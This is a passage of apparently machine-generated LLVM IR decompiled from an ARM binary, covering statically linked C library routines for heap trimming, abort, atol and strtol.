  %v3_136a4 = load i32, i32* %v2_136a4, align 4
  store i32 %v3_136a4, i32* %r3.global-to-local, align 4
  %v9_136a8 = icmp eq i32 %v3_136a4, %v2_1368c
  br i1 %v9_136a8, label %dec_label_pc_136b0, label %dec_label_pc_13708

dec_label_pc_136b0:                               ; preds = %dec_label_pc_136a4
  store i32 %v3_13690, i32* %v2_136a4, align 4
  %v0_136b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_136b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_136b4 = add i32 %v1_136b4, 12
  %v3_136b4 = inttoptr i32 %v2_136b4 to i32*
  store i32 %v0_136b4, i32* %v3_136b4, align 4
  %v0_136b8 = load i32, i32* %ip.global-to-local, align 4
  %v1_136b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_136b8 = add i32 %v1_136b8, %v0_136b8
  store i32 %v2_136b8, i32* %ip.global-to-local, align 4
  %v0_136c8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_136cc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_136bc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_1366c, %dec_label_pc_136b0
  %v0_13748 = phi i32 [ %v1_13678, %dec_label_pc_1366c ], [ %v2_136b8, %dec_label_pc_136b0 ]
  %v0_136cc = phi i32 [ %v3_13680, %dec_label_pc_1366c ], [ %v0_136cc.pre, %dec_label_pc_136b0 ]
  %v1_136e0 = phi i32 [ %v2_13678, %dec_label_pc_1366c ], [ %v0_136c8.pre, %dec_label_pc_136b0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_136c0 = load i32, i32* @r7, align 4
  %v2_136c0 = add i32 %v0_136c0, 64
  %v3_136c0 = inttoptr i32 %v2_136c0 to i32*
  %v4_136c0 = load i32, i32* %v3_136c0, align 4
  store i32 %v4_136c0, i32* %r2.global-to-local, align 4
  %v1_136c4 = add i32 %v4_136c0, 44
  %v2_136c4 = inttoptr i32 %v1_136c4 to i32*
  %v3_136c4 = load i32, i32* %v2_136c4, align 4
  store i32 %v3_136c4, i32* %r3.global-to-local, align 4
  %v9_136c8 = icmp eq i32 %v1_136e0, %v3_136c4
  %v1_136cc = and i32 %v0_136cc, -4
  store i32 %v1_136cc, i32* %r0.global-to-local, align 4
  br i1 %v9_136c8, label %dec_label_pc_13748, label %dec_label_pc_136d4

dec_label_pc_136d4:                               ; preds = %dec_label_pc_136bc
  %v2_136d4 = add i32 %v1_136e0, %v1_136cc
  store i32 %v2_136d4, i32* %r3.global-to-local, align 4
  %v1_136d8 = add i32 %v2_136d4, 4
  %v2_136d8 = inttoptr i32 %v1_136d8 to i32*
  %v3_136d8 = load i32, i32* %v2_136d8, align 4
  store i32 %v3_136d8, i32* %r3.global-to-local, align 4
  %v1_136dc = urem i32 %v3_136d8, 2
  %v2_136dc = icmp eq i32 %v1_136dc, 0
  %v2_136e0 = add i32 %v1_136e0, 4
  %v3_136e0 = inttoptr i32 %v2_136e0 to i32*
  store i32 %v1_136cc, i32* %v3_136e0, align 4
  br i1 %v2_136dc, label %dec_label_pc_136e8, label %dec_label_pc_136d4.dec_label_pc_13718_crit_edge

dec_label_pc_136d4.dec_label_pc_13718_crit_edge:  ; preds = %dec_label_pc_136d4
  %v0_13728.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13718

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136d4
  %v0_136e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_136e8 = add i32 %v0_136e8, 8
  %v2_136e8 = inttoptr i32 %v1_136e8 to i32*
  %v3_136e8 = load i32, i32* %v2_136e8, align 4
  store i32 %v3_136e8, i32* %r1.global-to-local, align 4
  %v1_136ec = add i32 %v3_136e8, 12
  %v2_136ec = inttoptr i32 %v1_136ec to i32*
  %v3_136ec = load i32, i32* %v2_136ec, align 4
  store i32 %v3_136ec, i32* %r3.global-to-local, align 4
  %v9_136f0 = icmp eq i32 %v3_136ec, %v0_136e8
  %v1_136f4 = add i32 %v0_136e8, 12
  %v2_136f4 = inttoptr i32 %v1_136f4 to i32*
  %v3_136f4 = load i32, i32* %v2_136f4, align 4
  store i32 %v3_136f4, i32* %r2.global-to-local, align 4
  br i1 %v9_136f0, label %dec_label_pc_136fc, label %dec_label_pc_13708

dec_label_pc_136fc:                               ; preds = %dec_label_pc_136e8
  %v1_136fc = add i32 %v3_136f4, 8
  %v2_136fc = inttoptr i32 %v1_136fc to i32*
  %v3_136fc = load i32, i32* %v2_136fc, align 4
  store i32 %v3_136fc, i32* %r3.global-to-local, align 4
  %v9_13700 = icmp eq i32 %v3_136fc, %v0_136e8
  br i1 %v9_13700, label %dec_label_pc_1370c, label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136e8, %dec_label_pc_136a4, %dec_label_pc_13688, %dec_label_pc_136fc
  %v0_13708 = call i32 @abort()
  store i32 %v0_13708, i32* %r0.global-to-local, align 4
  %v0_1370c.pre = load i32, i32* @r1, align 4
  %v1_1370c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1370c

dec_label_pc_1370c:                               ; preds = %dec_label_pc_136fc, %dec_label_pc_13708
  %v1_1370c = phi i32 [ %v3_136f4, %dec_label_pc_136fc ], [ %v1_1370c.pre, %dec_label_pc_13708 ]
  %v0_1370c = phi i32 [ %v3_136e8, %dec_label_pc_136fc ], [ %v0_1370c.pre, %dec_label_pc_13708 ]
  %v2_1370c = add i32 %v1_1370c, 8
  %v3_1370c = inttoptr i32 %v2_1370c to i32*
  store i32 %v0_1370c, i32* %v3_1370c, align 4
  %v0_13710 = load i32, i32* %r2.global-to-local, align 4
  %v1_13710 = load i32, i32* %r1.global-to-local, align 4
  %v2_13710 = add i32 %v1_13710, 12
  %v3_13710 = inttoptr i32 %v2_13710 to i32*
  store i32 %v0_13710, i32* %v3_13710, align 4
  %v0_13714 = load i32, i32* %ip.global-to-local, align 4
  %v1_13714 = load i32, i32* %r0.global-to-local, align 4
  %v2_13714 = add i32 %v1_13714, %v0_13714
  store i32 %v2_13714, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13718

dec_label_pc_13718:                               ; preds = %dec_label_pc_136d4.dec_label_pc_13718_crit_edge, %dec_label_pc_1370c
  %v0_13728 = phi i32 [ %v0_13728.pre, %dec_label_pc_136d4.dec_label_pc_13718_crit_edge ], [ %v2_13714, %dec_label_pc_1370c ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_1371c = load i32, i32* @r7, align 4
  %v2_1371c = add i32 %v0_1371c, 64
  %v3_1371c = inttoptr i32 %v2_1371c to i32*
  %v4_1371c = load i32, i32* %v3_1371c, align 4
  %v1_13720 = add i32 %v4_1371c, 52
  store i32 %v1_13720, i32* %r3.global-to-local, align 4
  %v1_13724 = add i32 %v4_1371c, 60
  %v2_13724 = inttoptr i32 %v1_13724 to i32*
  %v3_13724 = load i32, i32* %v2_13724, align 4
  store i32 %v3_13724, i32* %r1.global-to-local, align 4
  %v1_13728 = or i32 %v0_13728, 1
  store i32 %v1_13728, i32* %r2.global-to-local, align 4
  %v1_1372c = load i32, i32* %r4.global-to-local, align 4
  %v2_1372c = add i32 %v1_1372c, 12
  %v3_1372c = inttoptr i32 %v2_1372c to i32*
  store i32 %v1_13720, i32* %v3_1372c, align 4
  %v0_13730 = load i32, i32* %r1.global-to-local, align 4
  %v1_13730 = load i32, i32* %r4.global-to-local, align 4
  %v2_13730 = add i32 %v1_13730, 8
  %v3_13730 = inttoptr i32 %v2_13730 to i32*
  store i32 %v0_13730, i32* %v3_13730, align 4
  %v0_13734 = load i32, i32* %r2.global-to-local, align 4
  %v1_13734 = load i32, i32* %r4.global-to-local, align 4
  %v2_13734 = add i32 %v1_13734, 4
  %v3_13734 = inttoptr i32 %v2_13734 to i32*
  store i32 %v0_13734, i32* %v3_13734, align 4
  %v0_13738 = load i32, i32* %ip.global-to-local, align 4
  %v1_13738 = load i32, i32* %r4.global-to-local, align 4
  %v3_13738 = add i32 %v1_13738, %v0_13738
  %v4_13738 = inttoptr i32 %v3_13738 to i32*
  store i32 %v0_13738, i32* %v4_13738, align 4
  %v0_1373c = load i32, i32* %r4.global-to-local, align 4
  %v1_1373c = load i32, i32* %r1.global-to-local, align 4
  %v2_1373c = add i32 %v1_1373c, 12
  %v3_1373c = inttoptr i32 %v2_1373c to i32*
  store i32 %v0_1373c, i32* %v3_1373c, align 4
  %v0_13740 = load i32, i32* %r4.global-to-local, align 4
  %v1_13740 = load i32, i32* %r3.global-to-local, align 4
  %v2_13740 = add i32 %v1_13740, 8
  %v3_13740 = inttoptr i32 %v2_13740 to i32*
  store i32 %v0_13740, i32* %v3_13740, align 4
  br label %dec_label_pc_13758

dec_label_pc_13748:                               ; preds = %dec_label_pc_136bc
  %v2_13748 = add i32 %v1_136cc, %v0_13748
  store i32 %v2_13748, i32* %ip.global-to-local, align 4
  %v1_1374c = or i32 %v2_13748, 1
  store i32 %v1_1374c, i32* %r3.global-to-local, align 4
  %v0_13750 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13750, i32* %v2_136c4, align 4
  %v0_13754 = load i32, i32* %r3.global-to-local, align 4
  %v1_13754 = load i32, i32* %r4.global-to-local, align 4
  %v2_13754 = add i32 %v1_13754, 4
  %v3_13754 = inttoptr i32 %v2_13754 to i32*
  store i32 %v0_13754, i32* %v3_13754, align 4
  br label %dec_label_pc_13758

dec_label_pc_13758:                               ; preds = %dec_label_pc_13718, %dec_label_pc_13748
  %v0_13758 = load i32, i32* %ip.global-to-local, align 4
  %v3_1375c = icmp ult i32 %v0_13758, 131070
  br i1 %v3_1375c, label %dec_label_pc_137c8, label %dec_label_pc_13760

dec_label_pc_13760:                               ; preds = %dec_label_pc_13758
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_13764 = load i32, i32* @r7, align 4
  %v2_13764 = add i32 %v0_13764, 64
  %v3_13764 = inttoptr i32 %v2_13764 to i32*
  %v4_13764 = load i32, i32* %v3_13764, align 4
  store i32 %v4_13764, i32* @r4, align 4
  %v1_13768 = inttoptr i32 %v4_13764 to i32*
  %v2_13768 = load i32, i32* %v1_13768, align 4
  store i32 %v2_13768, i32* %r3.global-to-local, align 4
  %v1_1376c = and i32 %v2_13768, 2
  %v2_1376c = icmp eq i32 %v1_1376c, 0
  br i1 %v2_1376c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_13760
  store i32 %v4_13764, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_13760, %bb
  %v1_13774 = xor i1 %v2_1376c, true
  call void @__pseudo_cond_branch(i1 %v1_13774, i32 ptrtoint (i32* @global_var_13418.481 to i32))
  %v0_13778 = load i32, i32* @r4, align 4
  %v1_13778 = add i32 %v0_13778, 44
  %v2_13778 = inttoptr i32 %v1_13778 to i32*
  %v3_13778 = load i32, i32* %v2_13778, align 4
  store i32 %v3_13778, i32* %r3.global-to-local, align 4
  %v1_1377c = add i32 %v3_13778, 4
  %v2_1377c = inttoptr i32 %v1_1377c to i32*
  %v3_1377c = load i32, i32* %v2_1377c, align 4
  store i32 %v3_1377c, i32* %r3.global-to-local, align 4
  %v1_13780 = add i32 %v0_13778, 836
  %v2_13780 = inttoptr i32 %v1_13780 to i32*
  %v3_13780 = load i32, i32* %v2_13780, align 4
  store i32 %v3_13780, i32* %r2.global-to-local, align 4
  %v1_13784 = and i32 %v3_1377c, -4
  store i32 %v1_13784, i32* %r3.global-to-local, align 4
  %v3_13788 = icmp ult i32 %v1_13784, %v3_13780
  br i1 %v3_13788, label %dec_label_pc_137c8, label %dec_label_pc_13790

dec_label_pc_13790:                               ; preds = %bb16
  store i32 %v0_13778, i32* %r1.global-to-local, align 4
  %v1_13794 = add i32 %v0_13778, 840
  %v2_13794 = inttoptr i32 %v1_13794 to i32*
  %v3_13794 = load i32, i32* %v2_13794, align 4
  store i32 %v3_13794, i32* %r0.global-to-local, align 4
  %v2_13798 = call i32 @__malloc_trim(i32 %v3_13794, i32 %v0_13778)
  store i32 %v2_13798, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137a0:                               ; preds = %dec_label_pc_13664
  %v2_137a0 = inttoptr i32 %v1_13634 to i32*
  %v3_137a0 = load i32, i32* %v2_137a0, align 4
  store i32 %v3_137a0, i32* %r0.global-to-local, align 4
  %v1_137a4 = add i32 %v4_13624, 848
  %v2_137a4 = inttoptr i32 %v1_137a4 to i32*
  %v3_137a4 = load i32, i32* %v2_137a4, align 4
  store i32 %v3_137a4, i32* %r2.global-to-local, align 4
  %v1_137a8 = add i32 %v4_13624, 868
  %v2_137a8 = inttoptr i32 %v1_137a8 to i32*
  %v3_137a8 = load i32, i32* %v2_137a8, align 4
  %v2_137ac = add i32 %v3_137a0, %v1_13630
  store i32 %v2_137ac, i32* %r1.global-to-local, align 4
  %v1_137b0 = add i32 %v3_137a4, -1
  store i32 %v1_137b0, i32* %r2.global-to-local, align 4
  %v2_137b4 = sub i32 %v3_137a8, %v2_137ac
  store i32 %v2_137b4, i32* %r3.global-to-local, align 4
  store i32 %v2_137b4, i32* %v2_137a8, align 4
  %v1_137bc = load i32, i32* @lr, align 4
  %v2_137bc = add i32 %v1_137bc, 848
  %v3_137bc = inttoptr i32 %v2_137bc to i32*
  store i32 %v1_137b0, i32* %v3_137bc, align 4
  %v0_137c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_137c0 = load i32, i32* @r5, align 4
  %v2_137c0 = sub i32 %v1_137c0, %v0_137c0
  store i32 %v2_137c0, i32* %r0.global-to-local, align 4
  %v4_137c4 = call i32 @munmap(i32 %v2_137c0, i32 %v2_137ac, i32 %v1_137b0, i32 %v2_137b4)
  store i32 %v4_137c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %bb16, %dec_label_pc_13758, %dec_label_pc_13790, %dec_label_pc_13644, %dec_label_pc_137a0
  store i32 %v2_135d8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r7, align 4
  %v2_137d4 = add i32 %v0_137d4, 44
  %v3_137d4 = inttoptr i32 %v2_137d4 to i32*
  %v4_137d4 = load i32, i32* %v3_137d4, align 4
  store i32 %v4_137d4, i32* %ip.global-to-local, align 4
  store i32 79840, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_137d4)
  br label %dec_label_pc_137e0

dec_label_pc_137e0:                               ; preds = %entry, %dec_label_pc_137c8
  store i32 %v3_135cc, i32* @r4, align 4
  store i32 %v6_135cc, i32* @r5, align 4
  store i32 %v9_135cc, i32* @r6, align 4
  store i32 %v12_135cc, i32* @r7, align 4
  store i32 %v18_135cc, i32* @lr, align 4
  ret i32 %v2_135d8

; uselistorder directives
  uselistorder i32 %v0_13778, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_13738, { 1, 0 }
  uselistorder i32 %v1_13678, { 1, 0 }
  uselistorder i32 %v0_13678, { 1, 0 }
  uselistorder i32 %v3_1364c, { 1, 0 }
  uselistorder i32 %v1_13630, { 1, 0, 2 }
  uselistorder i32 %v2_1362c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13624, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135d4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 68) to i32*), { 0, 2, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_137e0, { 1, 0 }
  uselistorder label %dec_label_pc_137c8, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_13758, { 1, 0 }
  uselistorder label %dec_label_pc_13718, { 1, 0 }
  uselistorder label %dec_label_pc_1370c, { 1, 0 }
  uselistorder label %dec_label_pc_13708, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_136bc, { 1, 0 }
}

define i32 @function_137f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_137f0:
  %v0_137f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137f0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_137f0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_137f0, %bb
  %v4_13804 = phi i32 [ %arg1, %dec_label_pc_137f0 ], [ 0, %bb ]
  ret i32 %v4_13804

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_13808 = load i32, i32* @r4, align 4
  store i32 %v3_13808, i32* %stack_var_-12, align 4
  %v6_13808 = load i32, i32* @r5, align 4
  %v4_13818 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_13818, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_13818, i32* @r0, align 4
  %v0_13828 = call i32 @__malloc_consolidate()
  %v0_1382c = load i32, i32* @r4, align 4
  %v0_13830 = load i32, i32* @r5, align 4
  %v2_13838 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13838, i32* @r4, align 4
  store i32 %v6_13808, i32* @r5, align 4
  %v2_1383c = call i32 @__malloc_trim(i32 %v0_1382c, i32 %v0_13830)
  %v0_13840 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13840, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_13844 = phi i32 [ %v2_1383c, %entry ], [ 0, %bb ]
  ret i32 %v4_13844

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r5, align 4
  %v4_13860 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 16) to i32*), align 4
  store i32 79980, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13860)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_13888 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_13890 = load i32, i32* @r5, align 4
  %v2_13890 = add i32 %v0_13890, 632
  %v3_13890 = inttoptr i32 %v2_13890 to i32*
  %v4_13890 = load i32, i32* %v3_13890, align 4
  %v2_13894 = icmp eq i32 %v4_13890, 0
  br i1 %v2_13894, label %dec_label_pc_1389c, label %dec_label_pc_138dc

dec_label_pc_1389c:                               ; preds = %entry
  store i32 1, i32* %v3_13890, align 4
  br label %dec_label_pc_138a4

dec_label_pc_138a4:                               ; preds = %dec_label_pc_138ec, %dec_label_pc_1389c
  %v0_138a8 = load i32, i32* @r5, align 4
  %v2_138a8 = add i32 %v0_138a8, 212
  store i32 %v2_138a8, i32* @r4, align 4
  %v2_138b4 = add i32 %v0_138a8, 68
  %v3_138b4 = inttoptr i32 %v2_138b4 to i32*
  %v4_138b4 = load i32, i32* %v3_138b4, align 4
  call void @__pseudo_branch(i32 %v4_138b4)
  %v1_138c4 = call i32 @__GI_raise(i32 6)
  %v0_138d0 = load i32, i32* @r5, align 4
  %v2_138d0 = add i32 %v0_138d0, 16
  %v3_138d0 = inttoptr i32 %v2_138d0 to i32*
  %v4_138d0 = load i32, i32* %v3_138d0, align 4
  store i32 80092, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_138d0)
  %v0_138e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_138dc

dec_label_pc_138dc:                               ; preds = %entry, %dec_label_pc_138a4
  %v1_138f4 = phi i32 [ %v0_13890, %entry ], [ %v0_138e0.pre, %dec_label_pc_138a4 ]
  %v2_138e0 = add i32 %v1_138f4, 632
  %v3_138e0 = inttoptr i32 %v2_138e0 to i32*
  %v4_138e0 = load i32, i32* %v3_138e0, align 4
  %v7_138e4 = icmp eq i32 %v4_138e0, 1
  br i1 %v7_138e4, label %dec_label_pc_138ec, label %dec_label_pc_13928

dec_label_pc_138ec:                               ; preds = %dec_label_pc_138dc
  %v2_138ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_138ec, i32* @r4, align 4
  store i32 2, i32* %v3_138e0, align 4
  %v3_13904 = bitcast i32* %stack_var_-28 to i8*
  %v4_13904 = call i32 @__GI_memset(i8* %v3_13904, i32 0, i32 20)
  %v3_13920 = call i32 @__libc_sigaction(i32 6, i32 %v2_138ec, i32 0)
  br label %dec_label_pc_138a4

dec_label_pc_13928:                               ; preds = %dec_label_pc_138dc
  %v7_13928 = icmp eq i32 %v4_138e0, 2
  br i1 %v7_13928, label %dec_label_pc_13930, label %dec_label_pc_1393c

dec_label_pc_13930:                               ; preds = %dec_label_pc_13928
  store i32 3, i32* %v3_138e0, align 4
  %v0_13938 = call i32 @abort()
  %v0_1393c.pre = load i32, i32* @r5, align 4
  %v1_1393c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1393c

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13928, %dec_label_pc_13930
  %v3_13948 = phi i32 [ 632, %dec_label_pc_13928 ], [ %v1_1393c.pre, %dec_label_pc_13930 ]
  %v2_13948 = phi i32 [ %v1_138f4, %dec_label_pc_13928 ], [ %v0_1393c.pre, %dec_label_pc_13930 ]
  %v2_1393c = add i32 %v2_13948, %v3_13948
  %v3_1393c = inttoptr i32 %v2_1393c to i32*
  %v4_1393c = load i32, i32* %v3_1393c, align 4
  %v7_13940 = icmp eq i32 %v4_1393c, 3
  br i1 %v7_13940, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1393c
  store i32 4, i32* %v3_1393c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1393c, %bb
  call void @__pseudo_cond_branch(i1 %v7_13940, i32 ptrtoint (i32* @global_var_15520.490 to i32))
  br label %dec_label_pc_13954

dec_label_pc_13954:                               ; preds = %dec_label_pc_13954, %.thread2
  %v0_13954 = call i32 @abort()
  br label %dec_label_pc_13954

; uselistorder directives
  uselistorder i32* %v3_138e0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_1393c, { 1, 0 }
  uselistorder label %dec_label_pc_138dc, { 1, 0 }
}

define i32 @function_13960(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13960:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_13960 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13960, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_13960
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_13960, %bb
  %v4_1396c = phi i32 [ %tmp, %dec_label_pc_13960 ], [ 0, %bb ]
  ret i32 %v4_1396c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_13980 = call i32 @strtol()
  ret i32 %v0_13980
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_1399c = call i32 @_stdlib_strto_l()
  ret i32 %v0_1399c
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v0_139c0 = load i32, i32* @r1, align 4
  store i32 %v0_139c0, i32* %sb.global-to-local, align 4
  %v0_139c4 = load i32, i32* @r2, align 4
  store i32 %v0_139c4, i32* %r5.global-to-local, align 4
  %v0_139c8 = load i32, i32* @r0, align 4
  store i32 %v0_139c8, i32* %r4.global-to-local, align 4
  %v0_139cc = load i32, i32* @r3, align 4
  br label %dec_label_pc_139d8

dec_label_pc_139d4:                               ; preds = %dec_label_pc_139d8
  %v1_139d4 = add i32 %v0_13a10, 1
  store i32 %v1_139d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_139d8

dec_label_pc_139d8:                               ; preds = %entry, %dec_label_pc_139d4
  %v0_13a10 = phi i32 [ %v0_139c8, %entry ], [ %v1_139d4, %dec_label_pc_139d4 ]
  %v1_139d8 = inttoptr i32 %v0_13a10 to i8*
  %v2_139d8 = load i8, i8* %v1_139d8, align 1
  %v3_139d8 = zext i8 %v2_139d8 to i32
  store i32 %v3_139d8, i32* %r1.global-to-local, align 4
  %v4_139dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 276) to i32*), align 4
  %v2_139e0 = mul nuw nsw i32 %v3_139d8, 2
  %v2_139e4 = add i32 %v2_139e0, %v4_139dc
  %v3_139e4 = inttoptr i32 %v2_139e4 to i16*
  %v4_139e4 = load i16, i16* %v3_139e4, align 2
  %v1_139e8 = and i16 %v4_139e4, 32
  %v2_139e8 = icmp eq i16 %v1_139e8, 0
  br i1 %v2_139e8, label %dec_label_pc_139f0, label %dec_label_pc_139d4

dec_label_pc_139f0:                               ; preds = %dec_label_pc_139d8
  %v7_139f0 = icmp eq i8 %v2_139d8, 43
  br i1 %v7_139f0, label %dec_label_pc_13a10, label %dec_label_pc_139f8

dec_label_pc_139f8:                               ; preds = %dec_label_pc_139f0
  %v7_139f8 = icmp eq i8 %v2_139d8, 45
  br i1 %v7_139f8, label %dec_label_pc_13a10, label %bb

bb:                                               ; preds = %dec_label_pc_139f8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13a14

dec_label_pc_13a10:                               ; preds = %dec_label_pc_139f0, %dec_label_pc_139f8
  %storemerge47 = phi i32 [ 1, %dec_label_pc_139f8 ], [ 0, %dec_label_pc_139f0 ]
  store i32 %storemerge47, i32* %r7.global-to-local, align 4
  %v1_13a10 = add i32 %v0_13a10, 1
  store i32 %v1_13a10, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a14

dec_label_pc_13a14:                               ; preds = %bb, %dec_label_pc_13a10
  %v0_13a34 = phi i32 [ %v0_13a10, %bb ], [ %v1_13a10, %dec_label_pc_13a10 ]
  %v1_13a14 = and i32 %v0_139c4, -17
  %v3_13a14 = icmp eq i32 %v1_13a14, 0
  br i1 %v3_13a14, label %dec_label_pc_13a20, label %bb60

bb60:                                             ; preds = %dec_label_pc_13a14
  br label %bb64

dec_label_pc_13a20:                               ; preds = %dec_label_pc_13a14
  %v1_13a20 = inttoptr i32 %v0_13a34 to i8*
  %v2_13a20 = load i8, i8* %v1_13a20, align 1
  %v7_13a24 = icmp eq i8 %v2_13a20, 48
  %v1_13a28 = add i32 %v0_139c4, 10
  store i32 %v1_13a28, i32* %r5.global-to-local, align 4
  br i1 %v7_13a24, label %dec_label_pc_13a34, label %bb61

bb61:                                             ; preds = %dec_label_pc_13a20
  br label %.thread8

dec_label_pc_13a34:                               ; preds = %dec_label_pc_13a20
  %v1_13a34 = add i32 %v0_13a34, 1
  %v2_13a34 = inttoptr i32 %v1_13a34 to i8*
  %v3_13a34 = load i8, i8* %v2_13a34, align 1
  %v4_13a34 = zext i8 %v3_13a34 to i32
  store i32 %v1_13a34, i32* %r4.global-to-local, align 4
  %v1_13a38 = or i32 %v4_13a34, 32
  %v7_13a3c = icmp eq i32 %v1_13a38, 120
  %v1_13a40 = add i32 %v0_139c4, 8
  store i32 %v1_13a40, i32* %r5.global-to-local, align 4
  br i1 %v7_13a3c, label %bb62, label %.thread8

bb62:                                             ; preds = %dec_label_pc_13a34
  %v3_13a4c = mul i32 %v1_13a40, 2
  store i32 %v3_13a4c, i32* %r5.global-to-local, align 4
  %v2_13a50 = add i32 %v0_13a34, 2
  store i32 %v2_13a50, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_13a34, %bb61, %bb62
